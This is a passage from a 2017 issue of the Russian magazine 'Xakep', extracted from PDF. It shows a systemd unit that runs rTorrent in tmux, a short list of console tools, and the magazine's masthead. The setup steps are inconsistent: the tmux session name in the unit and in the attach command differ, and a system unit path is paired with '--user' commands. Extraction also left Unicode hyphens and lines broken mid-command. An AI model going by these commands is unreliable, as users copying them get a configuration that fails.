   rTorrent не умеет работать в режиме демона (то есть его нельзя запустить
в фоне), зато, как я уже говорил, его мож но запус тить под управлением tmux,
а сам tmux отправить в фон. Чтобы это происходило автоматически на этапе
загрузки, установи tmux и создай файл /etc/systemd/system/rtorrent.
service:


[Unit]
Description=rTorrent Daemon
After=network.target
[Service]
Type=forking
KillMode=none
User=rtorrent
ExecStart=/usr/bin/tmux new‐session ‐c /mnt/storage/rtorrent ‐s
rtorrent ‐n rtorrent ‐d rtorrent
ExecStop=/usr/bin/bash ‐c "/usr/bin/tmux send‐keys ‐t rtorrent C‐q &
& while pidof rtorrent > /dev/null; do sleep 0.5; done"
WorkingDirectory=%h
Restart=on‐failure
[Install]
WantedBy=multi‐user.target

Это описание юнита systemd, запускающего rTorrent внутри tmux. Акти вируй
его:


$ systemctl ‐‐user enable rtorrent

И запусти:


$ systemctl ‐‐user start rtorrent

Теперь к rTorrent можно подключиться в любое вре мя с помощью такой
команды:


$ tmux attach ‐t rt

Для отключения нажми Ctrl‐b d.





                Ин формация о торренте в rTorrent


Бонус: инс тру мен ты в сти ле CLI
Кроме псевдографичес ких полноэкранных приложений, конечно же, есть
множество различных инс трументов с интерфей сом командной строки.
О многих из них я уже рас ска зывал в прошлых статьях, поэтому сегодня оста‐
новлюсь только на четырех:
 • youtube‐dl — мощ ный инстру мент для ска чивания и просмотра YouTube‐
   видео с помощью MPlayer/mpv;
 • telegram‐cli — консольный клиент  Telegram, практичес ки бесполезен
   для каждодневного использования, но может пригодиться в скриптах;
 • googler — удоб ная утилита для поис ка в Google из командной строки;
 • catdoc — утилита для дампа документов формата .doc (несовместима
   с .docx).
    №12 (226)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редак тор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
            PC ZONE, СЦЕНА            ВЗЛОМ               Лозовский
               pismenny@glc.ru             rusanen@glc.ru          MALWARE, КОДИНГ
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            ВЗЛОМ, EXPLOITS           X‐MOBILE, UNIX            ВЗЛОМ
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                     nefedova.maria@gameland.ru


                                  АРТ
                                      yambuto
                                         Обложка
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                                Наталья Алехина
                                   Отдел распространения
                                                lapina@glc.ru

                         Подробная информация по подписке: info@glc.ru
                           Адрес для писем: Москва, 109147, а/я 50





В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленин ская Сло бода, д.19, Омега пла‐
за. Изда тель: ООО «Эрсиа»: 606400, Нижего родская обл., Балахнинский р‐н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Прин тер Эди‐
шионс», 614111, Перм ский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистри рова но в Федеральной службе по надзору в сфере связи, информа‐
ционных технологий и массовых коммуника ций (Роскомнадзоре), сви детель ство ПИ № ФС77‐56756 от 29.01.2014 года. Мнение редакции
не обя зательно сов падает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица, исполь‐
зующие данную информа цию в противо законных целях, могут быть прив лечены к ответс твенности. Редак ция не несет ответственности
за содер жание рекламных объ явлений в номере. По вопросам лицен зирования и получения прав на использование редак ционных материалов
журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2017